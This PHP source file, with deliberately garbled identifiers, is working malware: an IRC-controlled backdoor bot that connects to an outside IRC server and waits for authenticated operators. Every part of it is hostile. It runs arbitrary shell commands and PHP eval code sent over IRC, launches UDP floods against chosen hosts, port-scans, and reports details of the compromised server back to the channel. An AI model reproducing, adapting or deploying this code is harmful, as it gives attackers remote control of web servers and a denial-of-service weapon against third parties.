<?php set_time_limit(0); error_reporting(0);  class jbVvFbjvfvfRbZfRB {

 var $FnFrzrNZnjzZbFJ = array("fZbNznffJnvNNbBn"=>"gang.sexpil.net",
                     "JnVB"=>"23232",
                     "njNjZ"=>"scary",
                     "ZjvBRF"=>"13",
                     "XPdDd"=>"#wWw#",
                     "zfV"=>"scan",
                     "nZffzvRjF"=>"41aa15390e2efa34ac693c3bd7cb8e88",
                     "nfRjfFRnrZ"=>".",
                     "JbVfvBvJrvz"=>"a87710e60dee7645081a8fc2fab74dbd");
                      var $JBnfNvFBJzNNfBFVff = array(); 
 function uuuEuEIeMIiymmIeM() {
  $XHldlx = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';	
  $pdlXhtH = strlen($XHldlx);
  for($d=0;$d<6;$d++) {
	$eEy .= $XHldlx[rand(0,$pdlXhtH-1)];
  }
  if(php_uname() == "") { $LPthhDXX = "---"; } else { $LPthhDXX = php_uname(); }
  $this->EeqMIeA("USER ".$eEy."-go 127.0.0.1 localhost :".$LPthhDXX."");
 } function IeemUaAimiAIQQEMMi($PPXX,$LThtttTLXH,$MmME) {
	$this->yuyyQUIiIaq($this->FnFrzrNZnjzZbFJ['XPdDd'],"[\002UdpFlood Gestart!\002]"); 
	$xTTPXtpXD = "";
	for($d=0;$d<$LThtttTLXH;$d++) { $xTTPXtpXD .= chr(mt_rand(1,256)); }
	$XthTp = time();
	$d = 0;
	while(time()-$XthTp < $MmME) {
		$Fl=fsockopen("udp://".$PPXX,mt_rand(0,6000),$e,$s,5);
      	fwrite($Fl,$xTTPXtpXD);
       	fclose($Fl);
		$d++;
	}
	$nod = $d * $LThtttTLXH;
	$nod = $nod / 1048576;
	$XVG = $nod / $MmME;
	$XVG = round($XVG);
	$nod = round($nod);
	$this->yuyyQUIiIaq($this->FnFrzrNZnjzZbFJ['XPdDd'],"[\002UdpFlood Afgerond!\002]: $nod MB verzonden / gemiddelde: $XVG MB/s ");
 } function ueQaeAQYAiuyy() 
 { 
    if(!($this->OsWcgOcSg = fsockopen($this->FnFrzrNZnjzZbFJ['fZbNznffJnvNNbBn'],$this->FnFrzrNZnjzZbFJ['JnVB'],$e,$s,30))) 
    $this->ueQaeAQYAiuyy(); 
    $this->uuuEuEIeMIiymmIeM();
    if(strlen($this->FnFrzrNZnjzZbFJ['njNjZ'])>0) 
    $this->EeqMIeA("PASS ".$this->FnFrzrNZnjzZbFJ['njNjZ']);
    $this->qYyyUemYMQMiQuEQ();
    $this->QeiyIaiIAEMeai();
 } function MyYUEeYYMuQI($PPXX) 
 { 
    if(isset($this->JBnfNvFBJzNNfBFVff[$PPXX])) 
       return 1; 
    else 
       return 0; 
 } function yuyyQUIiIaq($th,$tpx)
 {
    $this->EeqMIeA("PRIVMSG $th :$tpx");
 } function EeqMIeA($tpx) 
 { 
    fwrite($this->OsWcgOcSg,"$tpx\r\n"); 
 } function uuIUQUIa($PPXX) 
 { 
    unset($this->JBnfNvFBJzNNfBFVff[$PPXX]); 
 } function UuAQIeyMMq($th,$tpx)
 {
    $this->EeqMIeA("NOTICE $th :$tpx");
 } function QEYMEi($XPdDd,$zfV=NULL) 
 { 
    $this->EeqMIeA("JOIN $XPdDd $zfV"); 
 } function qYyyUemYMQMiQuEQ() {
  $XHldlx = '[abcdefghijklm)nopqrstuvwxyz_ABCDEFGHIJKLM(NOPQRSTUVWXYZ-0123456789]';	
  $pdlXhtH = strlen($XHldlx);
  for($d=0;$d<$this->FnFrzrNZnjzZbFJ['ZjvBRF'];$d++) {
	$eEy .= $XHldlx[rand(0,$pdlXhtH-1)];
  }
  $this->EeqMIeA("NICK ".$eEy."");
 }function QeiyIaiIAEMeai() 
 { 
    while(!feof($this->OsWcgOcSg)) 
    { 
       $this->umYUy = trim(fgets($this->OsWcgOcSg,512)); 
       $jJZRnvjFfRrnF = explode(" ",$this->umYUy); 
       if(substr($this->umYUy,0,6)=="PING :") 
       { 
          $this->EeqMIeA("PONG :".substr($this->umYUy,6)); 
       } 
       if(isset($jJZRnvjFfRrnF[1]) && $jJZRnvjFfRrnF[1] =="004") 
       { 
          $this->EeqMIeA("JOIN ".$this->FnFrzrNZnjzZbFJ['XPdDd']." ".$this->FnFrzrNZnjzZbFJ['zfV']."");
          $this->QEYMEi($this->FnFrzrNZnjzZbFJ['XPdDd'],$this->FnFrzrNZnjzZbFJ['zfV']);
          $this->eqqmEyyaMMMUYuyaiUE();
       } 
       if(isset($jJZRnvjFfRrnF[1]) && $jJZRnvjFfRrnF[1]=="433") 
       { 
          $this->qYyyUemYMQMiQuEQ(); 
       }
       if($this->umYUy != $FJv_PPD) 
       { 
          $bvJrJBRRbjZzjV = array(); 
          $Oow = substr(strstr($this->umYUy," :"),2); 
          $WoOk = explode(" ",$Oow); 
          $SwKSK = explode("!",$jJZRnvjFfRrnF[0]); 
          $cwkoGW = explode("@",$SwKSK[1]); 
          $cwkoGW = $cwkoGW[1]; 
          $SwKSK = substr($SwKSK[0],1); 
          $kKWSKKG = $jJZRnvjFfRrnF[0]; 
          if($WoOk[0]==$this->SwKSK) 
          { 
           for($d=0;$d<count($WoOk);$d++) 
              $bvJrJBRRbjZzjV[$d] = $WoOk[$d+1]; 
          } 
          else 
          { 
           for($d=0;$d<count($WoOk);$d++) 
              $bvJrJBRRbjZzjV[$d] = $WoOk[$d]; 
          } 
          if(count($jJZRnvjFfRrnF)>2) 
          { 
             switch($jJZRnvjFfRrnF[1]) 
             { 
                case "QUIT": 
                   if($this->MyYUEeYYMuQI($kKWSKKG)) 
                   { 
                      $this->uuIUQUIa($kKWSKKG); 
                   } 
                break; 
                case "PART": 
                   if($this->MyYUEeYYMuQI($kKWSKKG)) 
                   { 
                      $this->uuIUQUIa($kKWSKKG); 
                   } 
                break; 
                case "PRIVMSG": 
                   if(!$this->MyYUEeYYMuQI($kKWSKKG) && (md5($cwkoGW) == $this->FnFrzrNZnjzZbFJ['JbVfvBvJrvz'] || $this->FnFrzrNZnjzZbFJ['JbVfvBvJrvz'] == "*")) 
                   { 
                      if(substr($bvJrJBRRbjZzjV[0],0,1)==$this->FnFrzrNZnjzZbFJ['nfRjfFRnrZ']) 
                      { 
                         switch(substr($bvJrJBRRbjZzjV[0],1)) 
                         { 
                            case "user": 
                              if(md5($bvJrJBRRbjZzjV[1])==$this->FnFrzrNZnjzZbFJ['nZffzvRjF']) 
                              { 
                                 $this->YEIEIEUEY($kKWSKKG);
                              } 
                              else 
                              { 
                                 $this->UuAQIeyMMq($this->FnFrzrNZnjzZbFJ['XPdDd'],"[\002Auth\002]: Fout password $SwKSK idioot!!");
                              } 
                            break; 
                         } 
                      } 
                   }
                   elseif($this->MyYUEeYYMuQI($kKWSKKG)) 
                   { 
                      if(substr($bvJrJBRRbjZzjV[0],0,1)==$this->FnFrzrNZnjzZbFJ['nfRjfFRnrZ']) 
                      { 
                         switch(substr($bvJrJBRRbjZzjV[0],1)) 
                         {                            case "system": 
                               $ksGWkksWsSOG = substr(strstr($Oow,$bvJrJBRRbjZzjV[0]),strlen($bvJrJBRRbjZzjV[0])+1); 
                               $CsskcccSCKgsG = system($ksGWkksWsSOG); 
                               $KCskSCwOgWwSos = explode("\n",$CsskcccSCKgsG); 
                               for($d=0;$d<count($KCskSCwOgWwSos);$d++) 
                                  if($KCskSCwOgWwSos[$d]!=NULL) 
                                     $this->yuyyQUIiIaq($this->FnFrzrNZnjzZbFJ['XPdDd'],"      : ".trim($KCskSCwOgWwSos[$d])); 
                            break;                            case "exec": 
                               $ksGWkksWsSOG = substr(strstr($Oow,$bvJrJBRRbjZzjV[0]),strlen($bvJrJBRRbjZzjV[0])+1); 
                               $CsskcccSCKgsG = exec($ksGWkksWsSOG); 
                               $KCskSCwOgWwSos = explode("\n",$CsskcccSCKgsG); 
                               for($d=0;$d<count($KCskSCwOgWwSos);$d++) 
                                  if($KCskSCwOgWwSos[$d]!=NULL) 
                                     $this->yuyyQUIiIaq($this->FnFrzrNZnjzZbFJ['XPdDd'],"      : ".trim($KCskSCwOgWwSos[$d])); 
                            break;                            case "udpflood": 
                               if(count($bvJrJBRRbjZzjV)>3) 
                               { 
                                  $this->IeemUaAimiAIQQEMMi($bvJrJBRRbjZzjV[1],$bvJrJBRRbjZzjV[2],$bvJrJBRRbjZzjV[3]); 
                               } 
                            break;                            case "logout": 
                               $this->uuIUQUIa($kKWSKKG); 
                               $this->yuyyQUIiIaq($this->FnFrzrNZnjzZbFJ['XPdDd'],"[\002Auth\002]\00314 Je bent nu uitgelogt $SwKSK"); 
                            break;                            case "pscan": 
                               if(count($bvJrJBRRbjZzjV) > 2) 
                               { 
                                  if(fsockopen($bvJrJBRRbjZzjV[1],$bvJrJBRRbjZzjV[2],$e,$s,15)) 
                                     $this->yuyyQUIiIaq($this->FnFrzrNZnjzZbFJ['XPdDd'],"[\002pscan\002]: ".$bvJrJBRRbjZzjV[1].":".$bvJrJBRRbjZzjV[2]." is \2open\2"); 
                                  else 
                                     $this->yuyyQUIiIaq($this->FnFrzrNZnjzZbFJ['XPdDd'],"[\002pscan\002]: ".$bvJrJBRRbjZzjV[1].":".$bvJrJBRRbjZzjV[2]." is \2closed\2"); 
                               } 
                            break;                            case "die": 
                               $this->EeqMIeA("QUIT :die command from $SwKSK");
                               fclose($this->OsWcgOcSg); 
                               exit;                            case "restart": 
                               $this->EeqMIeA("QUIT :gerestart door $SwKSK");
                               fclose($this->OsWcgOcSg); 
                               $this->ueQaeAQYAiuyy(); 
                            break;                            case "passthru": 
                               $ksGWkksWsSOG = substr(strstr($Oow,$bvJrJBRRbjZzjV[0]),strlen($bvJrJBRRbjZzjV[0])+1); 

                               $CsskcccSCKgsG = passthru($ksGWkksWsSOG); 
                               $KCskSCwOgWwSos = explode("\n",$CsskcccSCKgsG); 
                               for($d=0;$d<count($KCskSCwOgWwSos);$d++) 
                                  if($KCskSCwOgWwSos[$d]!=NULL) 
                                     $this->yuyyQUIiIaq($this->FnFrzrNZnjzZbFJ['XPdDd'],"      : ".trim($KCskSCwOgWwSos[$d])); 
                            break;                            case "dns": 
                               if(isset($bvJrJBRRbjZzjV[1])) 
                               { 
                                  $Og = explode(".",$bvJrJBRRbjZzjV[1]); 
                                  if(count($Og)==4 && is_numeric($Og[0]) && is_numeric($Og[1]) && is_numeric($Og[2]) && is_numeric($Og[3])) 
                                  { 
                                     $this->yuyyQUIiIaq($this->FnFrzrNZnjzZbFJ['XPdDd'],"[\002dns\002]: ".$bvJrJBRRbjZzjV[1]." => ".gethostbyaddr($bvJrJBRRbjZzjV[1])); 
                                  } 
                                  else 
                                  { 
                                     $this->yuyyQUIiIaq($this->FnFrzrNZnjzZbFJ['XPdDd'],"[\002dns\002]: ".$bvJrJBRRbjZzjV[1]." => ".gethostbyname($bvJrJBRRbjZzjV[1])); 
                                  } 
                               } 
                            break;                            case "rndnick": 
                               $this->qYyyUemYMQMiQuEQ(); 
                            break;                            case "info":
                               $this->eqqmEyyaMMMUYuyaiUE();
                            break;                            case "raw":
                               $this->EeqMIeA(strstr($Oow,$bvJrJBRRbjZzjV[1])); 
                            break;                            case "eval":
                              $eval = eval(substr(strstr($Oow,$bvJrJBRRbjZzjV[1]),strlen($bvJrJBRRbjZzjV[1])));
                            break;                            case "sexec":
                               $ksGWkksWsSOG = substr(strstr($Oow,$bvJrJBRRbjZzjV[0]),strlen($bvJrJBRRbjZzjV[0])+1); 
                               $CsskcccSCKgsG = shell_exec($ksGWkksWsSOG); 
                               $KCskSCwOgWwSos = explode("\n",$CsskcccSCKgsG); 
                               for($d=0;$d<count($KCskSCwOgWwSos);$d++) 
                                  if($KCskSCwOgWwSos[$d]!=NULL) 
                                     $this->yuyyQUIiIaq($this->FnFrzrNZnjzZbFJ['XPdDd'],"      : ".trim($KCskSCwOgWwSos[$d])); 
                            break;                         } 
                      } 
                   } 
                break; 
             } 
          } 
       } 
       $FJv_PPD = $this->umYUy; 
    } 
    $this->ueQaeAQYAiuyy(); 
 } function eqqmEyyaMMMUYuyaiUE() {
	if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $HlLTLHhHHpX = "\0034ON\003"; } else { $HlLTLHhHHpX = "\0039OFF\003"; }

	$LPthhDXX = php_uname();
	if($LPthhDXX == "") { $nNSgdD = "\00315---\003"; } else { $nNSgdD = "\00315".$LPthhDXX."\003"; }
		 
	 $FJgK = "\00315http://".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."\003";
	 
	 $htWsw =  getcwd()."";
	 
	 $tOgO = "\00315".$htWsw."\003";

	$KSgcOsGoWw = fileperms("$htWsw");

	if (($KSgcOsGoWw & 0xC000) == 0xC000) { $SgGkkoOgcgg = 's';
	} elseif (($KSgcOsGoWw & 0xA000) == 0xA000) { $SgGkkoOgcgg = 'l';
	} elseif (($KSgcOsGoWw & 0x8000) == 0x8000) { $SgGkkoOgcgg = '-';
	} elseif (($KSgcOsGoWw & 0x6000) == 0x6000) { $SgGkkoOgcgg = 'b';
	} elseif (($KSgcOsGoWw & 0x4000) == 0x4000) { $SgGkkoOgcgg = 'd';
	} elseif (($KSgcOsGoWw & 0x2000) == 0x2000) { $SgGkkoOgcgg = 'c';
	} elseif (($KSgcOsGoWw & 0x1000) == 0x1000) { $SgGkkoOgcgg = 'p';
	} else { $SgGkkoOgcgg = 'u'; }

	$SgGkkoOgcgg .= (($KSgcOsGoWw & 0x0100) ? 'r' : '-');
	$SgGkkoOgcgg .= (($KSgcOsGoWw & 0x0080) ? 'w' : '-');
	$SgGkkoOgcgg .= (($KSgcOsGoWw & 0x0040) ?	(($KSgcOsGoWw & 0x0800) ? 's' : 'x' ) :	(($KSgcOsGoWw & 0x0800) ? 'S' : '-'));

	$SgGkkoOgcgg .= (($KSgcOsGoWw & 0x0020) ? 'r' : '-');
	$SgGkkoOgcgg .= (($KSgcOsGoWw & 0x0010) ? 'w' : '-');
	$SgGkkoOgcgg .= (($KSgcOsGoWw & 0x0008) ?	(($KSgcOsGoWw & 0x0400) ? 's' : 'x' ) :	(($KSgcOsGoWw & 0x0400) ? 'S' : '-'));

	$SgGkkoOgcgg .= (($KSgcOsGoWw & 0x0004) ? 'r' : '-');
	$SgGkkoOgcgg .= (($KSgcOsGoWw & 0x0002) ? 'w' : '-');
	$SgGkkoOgcgg .= (($KSgcOsGoWw & 0x0001) ?	(($KSgcOsGoWw & 0x0200) ? 't' : 'x' ) :	(($KSgcOsGoWw & 0x0200) ? 'T' : '-'));
			
	$fNxp = "\00315".$SgGkkoOgcgg."\003";

	$this->yuyyQUIiIaq($this->FnFrzrNZnjzZbFJ['XPdDd'],"\00314[SAFE:\003\002 $HlLTLHhHHpX\002\00314]\00315 $FJgK \00314[pwd:]\00315 $tOgO \00314(\003$fNxp\00314) [uname:]\00315 $nNSgdD");
 } function YEIEIEUEY($PPXX) 
 { 
    $this->JBnfNvFBJzNNfBFVff[$PPXX] = true; 
 }}
$okKKooWG = new jbVvFbjvfvfRbZfRB;
$okKKooWG->ueQaeAQYAiuyy(); ?>